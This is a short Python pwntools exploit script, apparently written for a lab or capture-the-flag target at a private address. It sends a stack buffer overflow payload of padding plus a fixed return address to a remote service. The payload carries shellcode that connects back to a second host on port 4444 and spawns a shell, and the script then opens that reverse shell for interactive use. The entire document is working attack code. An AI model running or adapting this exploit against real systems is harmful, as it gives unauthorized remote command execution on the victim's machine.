from pwn import *
context.arch = "amd64"
context.log_level = "debug"

sh = listen(4444)
#io = remote("127.0.0.1",12340)
io = remote("10.30.0.139",8888)

sc = asm(shellcraft.connect('10.30.0.131',4444)+shellcraft.dupsh())
payload = b"A"*30+p64(0x40120c)+sc 
io.send(payload)

sh.wait_for_connection()
sh.interactive()
